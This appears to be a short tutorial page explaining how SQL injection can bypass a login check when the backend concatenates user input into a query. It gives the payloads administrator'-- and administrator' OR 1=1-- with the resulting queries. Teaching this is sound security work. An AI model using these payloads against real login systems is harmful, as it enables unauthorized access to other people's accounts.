---
title: Login Bypass
date: 2025-10-12
description: Introduce how to bypass login via SQL injection.
weight: 1
---

## Query Statement

Suppose that the query statement of a login operation is:

```sql
SELECT * FROM users WHERE username = 'user' AND password = 'pwd'
```

And the frontend provides a form to login, which sends `username` and `password` to the backend. Then the backend simply concatenates these two arguments with the query statement, where attackers are able to bypass the login authentication.

For example, when a user submits the login information `my-name:my-password`, the query statement will be:

```sql
SELECT * FROM users WHERE username = 'my-name' AND password = 'my-password'
```

## Payload Construction

As we all known, all contents after `--` will be treated as comments in SQL. So the payload can be:

```text
username: administrator'--
      or: administrator' OR 1=1--
password: 123
```

Then the query statement will be:

```sql
SELECT * FROM users WHERE username = 'administrator'-- AND password = '123'
```

Or

```sql
SELECT * FROM users WHERE username = 'administrator' OR 1=1-- AND password = '123'
```

For the previous one, the backend will not check the password.

For the later one, the condition `1=1` is always `true`, so the query is always `true`.

Both statements can bypass the login authentication.
